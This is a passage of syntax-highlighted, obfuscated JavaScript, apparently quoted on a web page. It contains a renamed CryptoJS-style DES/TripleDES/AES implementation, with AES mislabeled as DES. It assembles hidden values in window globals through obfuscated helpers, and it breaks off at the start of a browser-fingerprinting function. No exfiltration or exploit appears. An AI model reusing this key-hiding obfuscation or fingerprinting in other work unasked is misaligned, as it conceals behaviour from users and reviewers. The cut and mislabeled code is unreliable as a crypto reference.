class="number">1024</span>,</span><br><span class="line">        <span class="number">216</span>: <span class="number">34604033</span>,</span><br><span class="line">        <span class="number">232</span>: <span class="number">1</span>,</span><br><span class="line">        <span class="number">248</span>: <span class="number">1049600</span>,</span><br><span class="line">        <span class="number">256</span>: <span class="number">33554432</span>,</span><br><span class="line">        <span class="number">272</span>: <span class="number">1048576</span>,</span><br><span class="line">        <span class="number">288</span>: <span class="number">33555457</span>,</span><br><span class="line">        <span class="number">304</span>: <span class="number">34603009</span>,</span><br><span class="line">        <span class="number">320</span>: <span class="number">1048577</span>,</span><br><span class="line">        <span class="number">336</span>: <span class="number">33555456</span>,</span><br><span class="line">        <span class="number">352</span>: <span class="number">34604032</span>,</span><br><span class="line">        <span class="number">368</span>: <span class="number">1049601</span>,</span><br><span class="line">        <span class="number">384</span>: <span class="number">1025</span>,</span><br><span class="line">        <span class="number">400</span>: <span class="number">34604033</span>,</span><br><span class="line">        <span class="number">416</span>: <span class="number">1049600</span>,</span><br><span class="line">        <span class="number">432</span>: <span class="number">1</span>,</span><br><span class="line">        <span class="number">448</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="number">464</span>: <span class="number">34603008</span>,</span><br><span class="line">        <span class="number">480</span>: <span class="number">33554433</span>,</span><br><span class="line">        <span class="number">496</span>: <span class="number">1024</span>,</span><br><span class="line">        <span class="number">264</span>: <span class="number">1049600</span>,</span><br><span class="line">        <span class="number">280</span>: <span class="number">33555457</span>,</span><br><span class="line">        <span class="number">296</span>: <span class="number">34603009</span>,</span><br><span class="line">        <span class="number">312</span>: <span class="number">1</span>,</span><br><span class="line">        <span class="number">328</span>: <span class="number">33554432</span>,</span><br><span class="line">        <span class="number">344</span>: <span class="number">1048576</span>,</span><br><span class="line">        <span class="number">360</span>: <span class="number">1025</span>,</span><br><span class="line">        <span class="number">376</span>: <span class="number">34604032</span>,</span><br><span class="line">        <span class="number">392</span>: <span class="number">33554433</span>,</span><br><span class="line">        <span class="number">408</span>: <span class="number">34603008</span>,</span><br><span class="line">        <span class="number">424</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="number">440</span>: <span class="number">34604033</span>,</span><br><span class="line">        <span class="number">456</span>: <span class="number">1049601</span>,</span><br><span class="line">        <span class="number">472</span>: <span class="number">1024</span>,</span><br><span class="line">        <span class="number">488</span>: <span class="number">33555456</span>,</span><br><span class="line">        <span class="number">504</span>: <span class="number">1048577</span></span><br><span class="line">    &#125;, &#123;</span><br><span class="line">        <span class="number">0</span>: <span class="number">134219808</span>,</span><br><span class="line">        <span class="number">1</span>: <span class="number">131072</span>,</span><br><span class="line">        <span class="number">2</span>: <span class="number">134217728</span>,</span><br><span class="line">        <span class="number">3</span>: <span class="number">32</span>,</span><br><span class="line">        <span class="number">4</span>: <span class="number">131104</span>,</span><br><span class="line">        <span class="number">5</span>: <span class="number">134350880</span>,</span><br><span class="line">        <span class="number">6</span>: <span class="number">134350848</span>,</span><br><span class="line">        <span class="number">7</span>: <span class="number">2048</span>,</span><br><span class="line">        <span class="number">8</span>: <span class="number">134348800</span>,</span><br><span class="line">        <span class="number">9</span>: <span class="number">134219776</span>,</span><br><span class="line">        <span class="number">10</span>: <span class="number">133120</span>,</span><br><span class="line">        <span class="number">11</span>: <span class="number">134348832</span>,</span><br><span class="line">        <span class="number">12</span>: <span class="number">2080</span>,</span><br><span class="line">        <span class="number">13</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="number">14</span>: <span class="number">134217760</span>,</span><br><span class="line">        <span class="number">15</span>: <span class="number">133152</span>,</span><br><span class="line">        <span class="number">2147483648</span>: <span class="number">2048</span>,</span><br><span class="line">        <span class="number">2147483649</span>: <span class="number">134350880</span>,</span><br><span class="line">        <span class="number">2147483650</span>: <span class="number">134219808</span>,</span><br><span class="line">        <span class="number">2147483651</span>: <span class="number">134217728</span>,</span><br><span class="line">        <span class="number">2147483652</span>: <span class="number">134348800</span>,</span><br><span class="line">        <span class="number">2147483653</span>: <span class="number">133120</span>,</span><br><span class="line">        <span class="number">2147483654</span>: <span class="number">133152</span>,</span><br><span class="line">        <span class="number">2147483655</span>: <span class="number">32</span>,</span><br><span class="line">        <span class="number">2147483656</span>: <span class="number">134217760</span>,</span><br><span class="line">        <span class="number">2147483657</span>: <span class="number">2080</span>,</span><br><span class="line">        <span class="number">2147483658</span>: <span class="number">131104</span>,</span><br><span class="line">        <span class="number">2147483659</span>: <span class="number">134350848</span>,</span><br><span class="line">        <span class="number">2147483660</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="number">2147483661</span>: <span class="number">134348832</span>,</span><br><span class="line">        <span class="number">2147483662</span>: <span class="number">134219776</span>,</span><br><span class="line">        <span class="number">2147483663</span>: <span class="number">131072</span>,</span><br><span class="line">        <span class="number">16</span>: <span class="number">133152</span>,</span><br><span class="line">        <span class="number">17</span>: <span class="number">134350848</span>,</span><br><span class="line">        <span class="number">18</span>: <span class="number">32</span>,</span><br><span class="line">        <span class="number">19</span>: <span class="number">2048</span>,</span><br><span class="line">        <span class="number">20</span>: <span class="number">134219776</span>,</span><br><span class="line">        <span class="number">21</span>: <span class="number">134217760</span>,</span><br><span class="line">        <span class="number">22</span>: <span class="number">134348832</span>,</span><br><span class="line">        <span class="number">23</span>: <span class="number">131072</span>,</span><br><span class="line">        <span class="number">24</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="number">25</span>: <span class="number">131104</span>,</span><br><span class="line">        <span class="number">26</span>: <span class="number">134348800</span>,</span><br><span class="line">        <span class="number">27</span>: <span class="number">134219808</span>,</span><br><span class="line">        <span class="number">28</span>: <span class="number">134350880</span>,</span><br><span class="line">        <span class="number">29</span>: <span class="number">133120</span>,</span><br><span class="line">        <span class="number">30</span>: <span class="number">2080</span>,</span><br><span class="line">        <span class="number">31</span>: <span class="number">134217728</span>,</span><br><span class="line">        <span class="number">2147483664</span>: <span class="number">131072</span>,</span><br><span class="line">        <span class="number">2147483665</span>: <span class="number">2048</span>,</span><br><span class="line">        <span class="number">2147483666</span>: <span class="number">134348832</span>,</span><br><span class="line">        <span class="number">2147483667</span>: <span class="number">133152</span>,</span><br><span class="line">        <span class="number">2147483668</span>: <span class="number">32</span>,</span><br><span class="line">        <span class="number">2147483669</span>: <span class="number">134348800</span>,</span><br><span class="line">        <span class="number">2147483670</span>: <span class="number">134217728</span>,</span><br><span class="line">        <span class="number">2147483671</span>: <span class="number">134219808</span>,</span><br><span class="line">        <span class="number">2147483672</span>: <span class="number">134350880</span>,</span><br><span class="line">        <span class="number">2147483673</span>: <span class="number">134217760</span>,</span><br><span class="line">        <span class="number">2147483674</span>: <span class="number">134219776</span>,</span><br><span class="line">        <span class="number">2147483675</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="number">2147483676</span>: <span class="number">133120</span>,</span><br><span class="line">        <span class="number">2147483677</span>: <span class="number">2080</span>,</span><br><span class="line">        <span class="number">2147483678</span>: <span class="number">131104</span>,</span><br><span class="line">        <span class="number">2147483679</span>: <span class="number">134350848</span></span><br><span class="line">    &#125;]</span><br><span class="line">      , h = [<span class="number">483991120</span>, <span class="number">1058535</span>, <span class="number">512567407</span>, <span class="number">10651221</span>, <span class="number">217723</span>]</span><br><span class="line">      , u = [<span class="number">4160749569</span>, <span class="number">528482304</span>, <span class="number">33030144</span>, <span class="number">2064384</span>, <span class="number">129024</span>, <span class="number">8064</span>, <span class="number">504</span>, <span class="number">2147483679</span>]</span><br><span class="line">      , p = o.<span class="property">DES</span> = n.<span class="title function_">extend</span>(&#123;</span><br><span class="line">        <span class="attr">_doReset</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> e = <span class="variable language_">this</span>.<span class="property">_key</span>.<span class="property">words</span>, t = [], r = <span class="number">0</span>; <span class="number">56</span> &gt; r; r++) &#123;</span><br><span class="line">                <span class="keyword">var</span> n = a[r] - <span class="number">1</span>;</span><br><span class="line">                t[r] = e[n &gt;&gt;&gt; <span class="number">5</span>] &gt;&gt;&gt; <span class="number">31</span> - n % <span class="number">32</span> &amp; <span class="number">1</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (e = <span class="variable language_">this</span>.<span class="property">_subKeys</span> = [],</span><br><span class="line">            n = <span class="number">0</span>; <span class="number">16</span> &gt; n; n++) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">var</span> i = e[n] = [], o = c[n], r = <span class="number">0</span>; <span class="number">24</span> &gt; r; r++)</span><br><span class="line">                    i[r / <span class="number">6</span> | <span class="number">0</span>] |= t[(s[r] - <span class="number">1</span> + o) % <span class="number">28</span>] &lt;&lt; <span class="number">31</span> - r % <span class="number">6</span>,</span><br><span class="line">                    i[<span class="number">4</span> + (r / <span class="number">6</span> | <span class="number">0</span>)] |= t[<span class="number">28</span> + (s[r + <span class="number">24</span>] - <span class="number">1</span> + o) % <span class="number">28</span>] &lt;&lt; <span class="number">31</span> - r % <span class="number">6</span>;</span><br><span class="line">                <span class="keyword">for</span> (i[<span class="number">0</span>] = i[<span class="number">0</span>] &lt;&lt; <span class="number">1</span> | i[<span class="number">0</span>] &gt;&gt;&gt; <span class="number">31</span>,</span><br><span class="line">                r = <span class="number">1</span>; <span class="number">7</span> &gt; r; r++)</span><br><span class="line">                    i[r] &gt;&gt;&gt;= <span class="number">4</span> * (r - <span class="number">1</span>) + <span class="number">3</span>;</span><br><span class="line">                i[<span class="number">7</span>] = i[<span class="number">7</span>] &lt;&lt; <span class="number">5</span> | i[<span class="number">7</span>] &gt;&gt;&gt; <span class="number">27</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (t = <span class="variable language_">this</span>.<span class="property">_invSubKeys</span> = [],</span><br><span class="line">            r = <span class="number">0</span>; <span class="number">16</span> &gt; r; r++)</span><br><span class="line">                t[r] = e[<span class="number">15</span> - r]</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">encryptBlock</span>: <span class="keyword">function</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">_doCryptBlock</span>(e, t, <span class="variable language_">this</span>.<span class="property">_subKeys</span>)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">decryptBlock</span>: <span class="keyword">function</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">_doCryptBlock</span>(e, t, <span class="variable language_">this</span>.<span class="property">_invSubKeys</span>)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">_doCryptBlock</span>: <span class="keyword">function</span>(<span class="params">r, n, i</span>) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">_lBlock</span> = r[n],</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">_rBlock</span> = r[n + <span class="number">1</span>],</span><br><span class="line">            e.<span class="title function_">call</span>(<span class="variable language_">this</span>, <span class="number">4</span>, <span class="number">252645135</span>),</span><br><span class="line">            e.<span class="title function_">call</span>(<span class="variable language_">this</span>, <span class="number">16</span>, <span class="number">65535</span>),</span><br><span class="line">            t.<span class="title function_">call</span>(<span class="variable language_">this</span>, <span class="number">2</span>, <span class="number">858993459</span>),</span><br><span class="line">            t.<span class="title function_">call</span>(<span class="variable language_">this</span>, <span class="number">8</span>, <span class="number">16711935</span>),</span><br><span class="line">            e.<span class="title function_">call</span>(<span class="variable language_">this</span>, <span class="number">1</span>, <span class="number">1431655765</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> o = <span class="number">0</span>; <span class="number">16</span> &gt; o; o++) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">var</span> a = i[o], s = <span class="variable language_">this</span>.<span class="property">_lBlock</span>, c = <span class="variable language_">this</span>.<span class="property">_rBlock</span>, h = <span class="number">0</span>, p = <span class="number">0</span>; <span class="number">8</span> &gt; p; p++)</span><br><span class="line">                    h |= l[p][((c ^ a[p]) &amp; u[p]) &gt;&gt;&gt; <span class="number">0</span>];</span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">_lBlock</span> = c,</span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">_rBlock</span> = s ^ h</span><br><span class="line">            &#125;</span><br><span class="line">            i = <span class="variable language_">this</span>.<span class="property">_lBlock</span>,</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">_lBlock</span> = <span class="variable language_">this</span>.<span class="property">_rBlock</span>,</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">_rBlock</span> = i,</span><br><span class="line">            e.<span class="title function_">call</span>(<span class="variable language_">this</span>, <span class="number">1</span>, <span class="number">1431655765</span>),</span><br><span class="line">            t.<span class="title function_">call</span>(<span class="variable language_">this</span>, <span class="number">8</span>, <span class="number">16711935</span>),</span><br><span class="line">            t.<span class="title function_">call</span>(<span class="variable language_">this</span>, <span class="number">2</span>, <span class="number">858993459</span>),</span><br><span class="line">            e.<span class="title function_">call</span>(<span class="variable language_">this</span>, <span class="number">16</span>, <span class="number">65535</span>),</span><br><span class="line">            e.<span class="title function_">call</span>(<span class="variable language_">this</span>, <span class="number">4</span>, <span class="number">252645135</span>),</span><br><span class="line">            r[n] = <span class="variable language_">this</span>.<span class="property">_lBlock</span>,</span><br><span class="line">            r[n + <span class="number">1</span>] = <span class="variable language_">this</span>.<span class="property">_rBlock</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">keySize</span>: <span class="number">2</span>,</span><br><span class="line">        <span class="attr">ivSize</span>: <span class="number">2</span>,</span><br><span class="line">        <span class="attr">blockSize</span>: <span class="number">2</span></span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="variable language_">window</span>[<span class="title function_">_hqjl</span>(<span class="string">&quot;rzKrleD&quot;</span>, <span class="number">2</span>, <span class="number">2</span>)] = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> c = <span class="number">0</span>; c &lt; h.<span class="property">length</span>; c++)</span><br><span class="line">        <span class="variable language_">window</span>[<span class="title function_">_hqjl</span>(<span class="string">&quot;rzKrleD&quot;</span>, <span class="number">2</span>, <span class="number">2</span>)] += h[c];</span><br><span class="line">    r.<span class="property">DES</span> = n.<span class="title function_">_createHelper</span>(p),</span><br><span class="line">    o = o.<span class="property">TripleDES</span> = n.<span class="title function_">extend</span>(&#123;</span><br><span class="line">        <span class="attr">_doReset</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> e = <span class="variable language_">this</span>.<span class="property">_key</span>.<span class="property">words</span>;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">_des1</span> = p.<span class="title function_">createEncryptor</span>(i.<span class="title function_">create</span>(e.<span class="title function_">slice</span>(<span class="number">0</span>, <span class="number">2</span>))),</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">_des2</span> = p.<span class="title function_">createEncryptor</span>(i.<span class="title function_">create</span>(e.<span class="title function_">slice</span>(<span class="number">2</span>, <span class="number">4</span>))),</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">_des3</span> = p.<span class="title function_">createEncryptor</span>(i.<span class="title function_">create</span>(e.<span class="title function_">slice</span>(<span class="number">4</span>, <span class="number">6</span>)))</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">encryptBlock</span>: <span class="keyword">function</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">_des1</span>.<span class="title function_">encryptBlock</span>(e, t),</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">_des2</span>.<span class="title function_">decryptBlock</span>(e, t),</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">_des3</span>.<span class="title function_">encryptBlock</span>(e, t)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">decryptBlock</span>: <span class="keyword">function</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">_des3</span>.<span class="title function_">decryptBlock</span>(e, t),</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">_des2</span>.<span class="title function_">encryptBlock</span>(e, t),</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">_des1</span>.<span class="title function_">decryptBlock</span>(e, t)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">keySize</span>: <span class="number">6</span>,</span><br><span class="line">        <span class="attr">ivSize</span>: <span class="number">2</span>,</span><br><span class="line">        <span class="attr">blockSize</span>: <span class="number">2</span></span><br><span class="line">    &#125;),</span><br><span class="line">    r.<span class="property">TripleDES</span> = n.<span class="title function_">_createHelper</span>(o)</span><br><span class="line">&#125;(),</span><br><span class="line"><span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> e = coypJsDk, t = e.<span class="property">lib</span>.<span class="property">BlockCipher</span>, r = e.<span class="property">algo</span>, n = [], i = [], o = [], a = [], s = [], c = [], l = [], h = [], u = [], p = [], f = [], d = <span class="number">0</span>; <span class="number">256</span> &gt; d; d++)</span><br><span class="line">        f[d] = <span class="number">128</span> &gt; d ? d &lt;&lt; <span class="number">1</span> : d &lt;&lt; <span class="number">1</span> ^ <span class="number">283</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> _ = <span class="number">0</span>, y = <span class="number">0</span>, d = <span class="number">0</span>; <span class="number">256</span> &gt; d; d++) &#123;</span><br><span class="line">        <span class="keyword">var</span> g = y ^ y &lt;&lt; <span class="number">1</span> ^ y &lt;&lt; <span class="number">2</span> ^ y &lt;&lt; <span class="number">3</span> ^ y &lt;&lt; <span class="number">4</span></span><br><span class="line">          , g = g &gt;&gt;&gt; <span class="number">8</span> ^ <span class="number">255</span> &amp; g ^ <span class="number">99</span>;</span><br><span class="line">        n[_] = g,</span><br><span class="line">        i[g] = _;</span><br><span class="line">        <span class="keyword">var</span> v = f[_]</span><br><span class="line">          , m = f[v]</span><br><span class="line">          , k = f[m]</span><br><span class="line">          , w = <span class="number">257</span> * f[g] ^ <span class="number">16843008</span> * g;</span><br><span class="line">        o[_] = w &lt;&lt; <span class="number">24</span> | w &gt;&gt;&gt; <span class="number">8</span>,</span><br><span class="line">        a[_] = w &lt;&lt; <span class="number">16</span> | w &gt;&gt;&gt; <span class="number">16</span>,</span><br><span class="line">        s[_] = w &lt;&lt; <span class="number">8</span> | w &gt;&gt;&gt; <span class="number">24</span>,</span><br><span class="line">        c[_] = w,</span><br><span class="line">        w = <span class="number">16843009</span> * k ^ <span class="number">65537</span> * m ^ <span class="number">257</span> * v ^ <span class="number">16843008</span> * _,</span><br><span class="line">        l[g] = w &lt;&lt; <span class="number">24</span> | w &gt;&gt;&gt; <span class="number">8</span>,</span><br><span class="line">        h[g] = w &lt;&lt; <span class="number">16</span> | w &gt;&gt;&gt; <span class="number">16</span>,</span><br><span class="line">        u[g] = w &lt;&lt; <span class="number">8</span> | w &gt;&gt;&gt; <span class="number">24</span>,</span><br><span class="line">        p[g] = w,</span><br><span class="line">        _ ? (_ = v ^ f[f[f[k ^ v]]],</span><br><span class="line">        y ^= f[f[y]]) : _ = y = <span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> b = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">16</span>, <span class="number">32</span>, <span class="number">64</span>, <span class="number">128</span>, <span class="number">27</span>, <span class="number">54</span>]</span><br><span class="line">      , r = r.<span class="property">DES</span> = t.<span class="title function_">extend</span>(&#123;</span><br><span class="line">        <span class="attr">_doReset</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> e = <span class="variable language_">this</span>.<span class="property">_key</span>, t = e.<span class="property">words</span>, r = e.<span class="property">sigBytes</span> / <span class="number">4</span>, e = <span class="number">4</span> * ((<span class="variable language_">this</span>.<span class="property">_nRounds</span> = r + <span class="number">6</span>) + <span class="number">1</span>), i = <span class="variable language_">this</span>.<span class="property">_keySchedule</span> = [], o = <span class="number">0</span>; e &gt; o; o++)</span><br><span class="line">                <span class="keyword">if</span> (r &gt; o)</span><br><span class="line">                    i[o] = t[o];</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">var</span> a = i[o - <span class="number">1</span>];</span><br><span class="line">                    o % r ? r &gt; <span class="number">6</span> &amp;&amp; <span class="number">4</span> == o % r &amp;&amp; (a = n[a &gt;&gt;&gt; <span class="number">24</span>] &lt;&lt; <span class="number">24</span> | n[a &gt;&gt;&gt; <span class="number">16</span> &amp; <span class="number">255</span>] &lt;&lt; <span class="number">16</span> | n[a &gt;&gt;&gt; <span class="number">8</span> &amp; <span class="number">255</span>] &lt;&lt; <span class="number">8</span> | n[<span class="number">255</span> &amp; a]) : (a = a &lt;&lt; <span class="number">8</span> | a &gt;&gt;&gt; <span class="number">24</span>,</span><br><span class="line">                    a = n[a &gt;&gt;&gt; <span class="number">24</span>] &lt;&lt; <span class="number">24</span> | n[a &gt;&gt;&gt; <span class="number">16</span> &amp; <span class="number">255</span>] &lt;&lt; <span class="number">16</span> | n[a &gt;&gt;&gt; <span class="number">8</span> &amp; <span class="number">255</span>] &lt;&lt; <span class="number">8</span> | n[<span class="number">255</span> &amp; a],</span><br><span class="line">                    a ^= b[o / r | <span class="number">0</span>] &lt;&lt; <span class="number">24</span>),</span><br><span class="line">                    i[o] = i[o - r] ^ a</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">for</span> (t = <span class="variable language_">this</span>.<span class="property">_invKeySchedule</span> = [],</span><br><span class="line">            r = <span class="number">0</span>; e &gt; r; r++)</span><br><span class="line">                o = e - r,</span><br><span class="line">                a = r % <span class="number">4</span> ? i[o] : i[o - <span class="number">4</span>],</span><br><span class="line">                t[r] = <span class="number">4</span> &gt; r || <span class="number">4</span> &gt;= o ? a : l[n[a &gt;&gt;&gt; <span class="number">24</span>]] ^ h[n[a &gt;&gt;&gt; <span class="number">16</span> &amp; <span class="number">255</span>]] ^ u[n[a &gt;&gt;&gt; <span class="number">8</span> &amp; <span class="number">255</span>]] ^ p[n[<span class="number">255</span> &amp; a]]</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">encryptBlock</span>: <span class="keyword">function</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">_doCryptBlock</span>(e, t, <span class="variable language_">this</span>.<span class="property">_keySchedule</span>, o, a, s, c, n)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">decryptBlock</span>: <span class="keyword">function</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> r = e[t + <span class="number">1</span>];</span><br><span class="line">            e[t + <span class="number">1</span>] = e[t + <span class="number">3</span>],</span><br><span class="line">            e[t + <span class="number">3</span>] = r,</span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">_doCryptBlock</span>(e, t, <span class="variable language_">this</span>.<span class="property">_invKeySchedule</span>, l, h, u, p, i),</span><br><span class="line">            r = e[t + <span class="number">1</span>],</span><br><span class="line">            e[t + <span class="number">1</span>] = e[t + <span class="number">3</span>],</span><br><span class="line">            e[t + <span class="number">3</span>] = r</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">_doCryptBlock</span>: <span class="keyword">function</span>(<span class="params">e, t, r, n, i, o, a, s</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> c = <span class="variable language_">this</span>.<span class="property">_nRounds</span>, l = e[t] ^ r[<span class="number">0</span>], h = e[t + <span class="number">1</span>] ^ r[<span class="number">1</span>], u = e[t + <span class="number">2</span>] ^ r[<span class="number">2</span>], p = e[t + <span class="number">3</span>] ^ r[<span class="number">3</span>], f = <span class="number">4</span>, d = <span class="number">1</span>; c &gt; d; d++)</span><br><span class="line">                <span class="keyword">var</span> _ = n[l &gt;&gt;&gt; <span class="number">24</span>] ^ i[h &gt;&gt;&gt; <span class="number">16</span> &amp; <span class="number">255</span>] ^ o[u &gt;&gt;&gt; <span class="number">8</span> &amp; <span class="number">255</span>] ^ a[<span class="number">255</span> &amp; p] ^ r[f++]</span><br><span class="line">                  , y = n[h &gt;&gt;&gt; <span class="number">24</span>] ^ i[u &gt;&gt;&gt; <span class="number">16</span> &amp; <span class="number">255</span>] ^ o[p &gt;&gt;&gt; <span class="number">8</span> &amp; <span class="number">255</span>] ^ a[<span class="number">255</span> &amp; l] ^ r[f++]</span><br><span class="line">                  , g = n[u &gt;&gt;&gt; <span class="number">24</span>] ^ i[p &gt;&gt;&gt; <span class="number">16</span> &amp; <span class="number">255</span>] ^ o[l &gt;&gt;&gt; <span class="number">8</span> &amp; <span class="number">255</span>] ^ a[<span class="number">255</span> &amp; h] ^ r[f++]</span><br><span class="line">                  , p = n[p &gt;&gt;&gt; <span class="number">24</span>] ^ i[l &gt;&gt;&gt; <span class="number">16</span> &amp; <span class="number">255</span>] ^ o[h &gt;&gt;&gt; <span class="number">8</span> &amp; <span class="number">255</span>] ^ a[<span class="number">255</span> &amp; u] ^ r[f++]</span><br><span class="line">                  , l = _</span><br><span class="line">                  , h = y</span><br><span class="line">                  , u = g;</span><br><span class="line">            _ = (s[l &gt;&gt;&gt; <span class="number">24</span>] &lt;&lt; <span class="number">24</span> | s[h &gt;&gt;&gt; <span class="number">16</span> &amp; <span class="number">255</span>] &lt;&lt; <span class="number">16</span> | s[u &gt;&gt;&gt; <span class="number">8</span> &amp; <span class="number">255</span>] &lt;&lt; <span class="number">8</span> | s[<span class="number">255</span> &amp; p]) ^ r[f++],</span><br><span class="line">            y = (s[h &gt;&gt;&gt; <span class="number">24</span>] &lt;&lt; <span class="number">24</span> | s[u &gt;&gt;&gt; <span class="number">16</span> &amp; <span class="number">255</span>] &lt;&lt; <span class="number">16</span> | s[p &gt;&gt;&gt; <span class="number">8</span> &amp; <span class="number">255</span>] &lt;&lt; <span class="number">8</span> | s[<span class="number">255</span> &amp; l]) ^ r[f++],</span><br><span class="line">            g = (s[u &gt;&gt;&gt; <span class="number">24</span>] &lt;&lt; <span class="number">24</span> | s[p &gt;&gt;&gt; <span class="number">16</span> &amp; <span class="number">255</span>] &lt;&lt; <span class="number">16</span> | s[l &gt;&gt;&gt; <span class="number">8</span> &amp; <span class="number">255</span>] &lt;&lt; <span class="number">8</span> | s[<span class="number">255</span> &amp; h]) ^ r[f++],</span><br><span class="line">            p = (s[p &gt;&gt;&gt; <span class="number">24</span>] &lt;&lt; <span class="number">24</span> | s[l &gt;&gt;&gt; <span class="number">16</span> &amp; <span class="number">255</span>] &lt;&lt; <span class="number">16</span> | s[h &gt;&gt;&gt; <span class="number">8</span> &amp; <span class="number">255</span>] &lt;&lt; <span class="number">8</span> | s[<span class="number">255</span> &amp; u]) ^ r[f++],</span><br><span class="line">            e[t] = _,</span><br><span class="line">            e[t + <span class="number">1</span>] = y,</span><br><span class="line">            e[t + <span class="number">2</span>] = g,</span><br><span class="line">            e[t + <span class="number">3</span>] = p</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">keySize</span>: <span class="number">8</span></span><br><span class="line">    &#125;);</span><br><span class="line">    e.<span class="property">DES</span> = t.<span class="title function_">_createHelper</span>(r)</span><br><span class="line">&#125;(),</span><br><span class="line"><span class="variable language_">window</span>.<span class="property">ea_</span> = <span class="string">&quot;e&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> coyp = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> ea_ + av_ + nvl_</span><br><span class="line">&#125;();</span><br><span class="line">coypJsDk.<span class="property">mode</span>.<span class="property">CBC</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> e = coypJsDk.<span class="property">lib</span>.<span class="property">BlockCipherMode</span>.<span class="title function_">extend</span>();</span><br><span class="line">    <span class="keyword">return</span> e.<span class="property">Encryptor</span> = e.<span class="title function_">extend</span>(&#123;</span><br><span class="line">        <span class="attr">processBlock</span>: <span class="keyword">function</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">_cipher</span>.<span class="title function_">encryptBlock</span>(e, t)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;),</span><br><span class="line">    e.<span class="property">Decryptor</span> = e.<span class="title function_">extend</span>(&#123;</span><br><span class="line">        <span class="attr">processBlock</span>: <span class="keyword">function</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">_cipher</span>.<span class="title function_">decryptBlock</span>(e, t)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;),</span><br><span class="line">    e</span><br><span class="line">&#125;();</span><br><span class="line"><span class="keyword">var</span> referFingerprint = <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> t, r;</span><br><span class="line">    t = <span class="title class_">Array</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">forEach</span>,</span><br><span class="line">    r = <span class="title class_">Array</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">map</span>,</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">each</span> = <span class="keyword">function</span>(<span class="params">e, r, n</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">null</span> !== e)</span><br><span class="line">            <span class="keyword">if</span> (t &amp;&amp; e.<span class="property">forEach</span> === t)</span><br><span class="line">                e.<span class="title function_">forEach</span>(r, n);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> 